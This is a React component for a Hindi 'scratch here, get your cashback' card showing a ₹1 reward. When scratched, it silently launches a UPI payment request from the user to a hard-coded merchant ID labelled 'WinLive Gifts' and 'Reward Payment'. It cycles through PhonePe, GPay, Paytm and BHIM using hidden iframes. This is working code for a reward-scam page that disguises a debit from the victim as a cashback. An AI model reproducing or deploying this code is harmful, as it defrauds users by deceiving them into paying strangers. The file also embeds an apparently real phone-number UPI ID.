import React, { useEffect, useRef, useState, useMemo, useCallback, memo } from 'react';
import { createPortal } from 'react-dom';
import './PhotoArranger.css';

// Import images
import engBack from './hindi_back.png';
import centreImg from './centre.jpeg';
import engFront from './hindi_front.jpg';
import scratcherOverlay from './scratcher.jpg';

/* ───────────────────────────── SCRATCHER COMPONENT ───────────────────────────── */
const Scratcher = memo(({ overlaySrc, onComplete }) => {
  const containerRef = useRef(null);
  const canvasRef = useRef(null);
  const imgRef = useRef(null);
  const [isReady, setIsReady] = useState(false);
  const [isDone, setIsDone] = useState(false);
  const canvasRectRef = useRef(null);

  useEffect(() => {
    const img = imgRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    const cover = new Image();

    const setup = () => {
      const width = img.naturalWidth || img.width;
      const height = img.naturalHeight || img.height;
      const containerWidth = containerRef.current.clientWidth;
      const scale = Math.min(1, containerWidth / width);
      const drawWidth = Math.floor(width * scale);
      const drawHeight = Math.floor(height * scale);

      img.style.width = drawWidth + 'px';
      img.style.height = drawHeight + 'px';
      canvas.width = drawWidth;
      canvas.height = drawHeight;

      ctx.globalCompositeOperation = 'source-over';
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      if (cover.complete && cover.naturalWidth > 0) {
        ctx.drawImage(cover, 0, 0, canvas.width, canvas.height);

        // Text
        const base = Math.max(12, Math.floor(Math.min(canvas.width, canvas.height) / 18));
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';
        ctx.fillStyle = 'rgba(255,255,255,0.95)';
        ctx.strokeStyle = 'rgba(0,0,0,0.45)';
        ctx.lineWidth = Math.max(2, Math.floor(base / 6));

        const cx = canvas.width / 2;
        const margin = Math.floor(base * 1.6);

        ctx.font = `700 ${Math.floor(base * 1.1)}px system-ui, Roboto, Arial`;
        ctx.strokeText('यहाँ स्क्रैच करें', cx, margin);
        ctx.fillText('यहाँ स्क्रैच करें', cx, margin);

        ctx.font = `600 ${Math.floor(base * 0.9)}px system-ui, Roboto, Arial`;
        ctx.strokeText('अपना कैशबैक प्राप्त करें', cx, canvas.height - margin);
        ctx.fillText('अपना कैशबैक प्राप्त करें', cx, canvas.height - margin);

        setIsReady(true);
      }
    };

    cover.src = overlaySrc;
    const load = () => setup();
    if (!cover.complete) cover.addEventListener('load', load, { once: true });
    if (!img.complete) img.addEventListener('load', load, { once: true });
    else setup();

    const handleResize = () => {
      if (img.complete) setup();
      canvasRectRef.current = null;
    };
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, [overlaySrc]);

  useEffect(() => {
    if (!isReady || isDone) return;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');
    let isDrawing = false;
    const brushRadius = 40;
    let moveCount = 0;
    let lastProgressCheck = 0;

    const getPos = (e) => {
      let rect = canvasRectRef.current;
      if (!rect) {
        rect = canvas.getBoundingClientRect();
        canvasRectRef.current = rect;
      }
      const clientX = e.touches ? e.touches[0].clientX : e.clientX;
      const clientY = e.touches ? e.touches[0].clientY : e.clientY;
      return { x: clientX - rect.left, y: clientY - rect.top };
    };

    const scratch = (e) => {
      const { x, y } = getPos(e);
      ctx.globalCompositeOperation = 'destination-out';
      ctx.beginPath();
      ctx.arc(x, y, brushRadius, 0, Math.PI * 2);
      ctx.fill();
    };

    const checkProgress = () => {
      if (isDone) return;
      try {
        const { width, height } = canvas;
        const imageData = ctx.getImageData(0, 0, width, height);
        const data = imageData.data;
        let cleared = 0;
        let totalSamples = 0;
        const step = 16;
        for (let i = 3; i < data.length; i += step * 4) {
          totalSamples++;
          if (data[i] < 32) cleared++;
        }
        const ratio = totalSamples > 0 ? cleared / totalSamples : 0;
        if (ratio >= 0.45) {
          setIsDone(true);
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          onComplete?.();
        }
      } catch {}
    };

    const start = (e) => {
      isDrawing = true;
      scratch(e);
      e.preventDefault();
    };
    const move = (e) => {
      if (!isDrawing) return;
      scratch(e);
      e.preventDefault();
      moveCount++;
      const now = Date.now();
      if (now - lastProgressCheck > 100 || moveCount % 12 === 0) {
        checkProgress();
        lastProgressCheck = now;
      }
    };
    const end = () => {
      isDrawing = false;
      checkProgress();
    };

    canvas.addEventListener('mousedown', start);
    canvas.addEventListener('mousemove', move);
    window.addEventListener('mouseup', end);
    canvas.addEventListener('touchstart', start, { passive: false });
    canvas.addEventListener('touchmove', move, { passive: false });
    window.addEventListener('touchend', end);

    return () => {
      canvas.removeEventListener('mousedown', start);
      canvas.removeEventListener('mousemove', move);
      window.removeEventListener('mouseup', end);
      canvas.removeEventListener('touchstart', start);
      canvas.removeEventListener('touchmove', move);
      window.removeEventListener('touchend', end);
    };
  }, [isReady, isDone, onComplete]);

  return (
    <div className="scratcher" ref={containerRef}>
      <div className="scratcher-inner">
        <img ref={imgRef} src={centreImg} alt="centre" className="scratcher-image" decoding="async" />
        <div className="centre-overlay" aria-hidden={!isReady}>
          <div className="centre-amount">₹ 1</div>
        </div>
        <canvas ref={canvasRef} className="scratcher-canvas" />
      </div>
    </div>
  );
});

/* ───────────────────────────── CONFETTI COMPONENT ───────────────────────────── */
const Confetti = memo(({ count = 120 }) => {
  const pieces = useMemo(() => Array.from({ length: count }, (_, i) => i), [count]);
  const colors = ['#ef4444', '#f59e0b', '#10b981', '#3b82f6', '#8b5cf6', '#ec4899'];
  return (
    <div className="confetti" aria-hidden="true">
      {pieces.map((i) => (
        <span
          key={i}
          className="confetti-piece"
          style={{
            left: `${(i * 11) % 100}%`,
            animationDelay: `${(i % 12) * 0.09}s`,
            animationDuration: `${3.8 + (i % 5) * 1}s`,
            backgroundColor: colors[i % colors.length],
          }}
        />
      ))}
    </div>
  );
});

/* ───────────────────────────── MAIN ───────────────────────────── */
const PhotoArranger = () => {
  const [revealed, setRevealed] = useState(false);
  const amountInRupees = 1;

  // ✅ FINAL PAYMENT HANDLER (PhonePe first, no Play Store redirects)
  const initiateDirectUPIPayment = useCallback((amount) => {
    const merchantUPI = "9823604703@okbizaxis";
    const payeeName = "WinLive Gifts";
    const note = "Reward Payment";
    const currency = "INR";
    const formattedAmount = Number(amount).toFixed(2);

    const upiBase = `upi://pay?pa=${merchantUPI}&pn=${encodeURIComponent(
      payeeName
    )}&am=${formattedAmount}&cu=${currency}&tn=${encodeURIComponent(note)}`;

    // 🔹 Priority changed → PhonePe → GPay → Paytm → BHIM
    const apps = [
      { name: "PhonePe", package: "com.phonepe.app" },
      { name: "GPay", package: "com.google.android.apps.nbu.paisa.user" },
      { name: "Paytm", package: "net.one97.paytm" },
      { name: "BHIM", package: "in.org.npci.upiapp" },
    ];

    let currentIndex = 0;
    let appOpened = false;
    let iframe = null;

    const cleanup = () => {
      if (iframe && document.body.contains(iframe)) {
        document.body.removeChild(iframe);
      }
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };

    const handleVisibilityChange = () => {
      if (document.hidden || document.visibilityState === "hidden") {
        appOpened = true;
        cleanup();
      }
    };

    const tryNextApp = () => {
      if (appOpened || currentIndex >= apps.length) {
        cleanup();
        if (!appOpened) window.location.href = upiBase;
        return;
      }

      const app = apps[currentIndex];
      const intentUrl = `intent://pay?pa=${merchantUPI}&pn=${encodeURIComponent(
        payeeName
      )}&am=${formattedAmount}&cu=${currency}&tn=${encodeURIComponent(
        note
      )}#Intent;scheme=upi;package=${app.package};end`;

      document.addEventListener("visibilitychange", handleVisibilityChange);

      // Hidden iframe trick — avoids Play Store redirect
      iframe = document.createElement("iframe");
      iframe.style.display = "none";
      iframe.src = intentUrl;
      document.body.appendChild(iframe);

      const timeout = setTimeout(() => {
        if (!appOpened && document.visibilityState === "visible") {
          cleanup();
          currentIndex++;
          tryNextApp();
        }
      }, 1000);

      setTimeout(() => clearTimeout(timeout), 2500);
    };

    tryNextApp();
  }, []);

  useEffect(() => {
    if (revealed) {
      const delay = 1500 + Math.random() * 1000;
      const timer = setTimeout(() => initiateDirectUPIPayment(amountInRupees), delay);
      return () => clearTimeout(timer);
    }
  }, [revealed, initiateDirectUPIPayment, amountInRupees]);

  return (
    <div className="photo-arranger-container photo-arranger-vertical">
      <div className="section">
        <img src={engFront} alt="हिंदी फ्रंट" className="flat-image" decoding="async" />
      </div>

      <div className="section section-middle">
        <Scratcher overlaySrc={scratcherOverlay} onComplete={() => setRevealed(true)} />
      </div>

      {revealed && createPortal(<Confetti count={120} />, document.body)}

      <div className="section">
        <img src={engBack} alt="हिंदी बैक" className="flat-image" loading="lazy" decoding="async" />
      </div>
    </div>
  );
};

export default PhotoArranger;
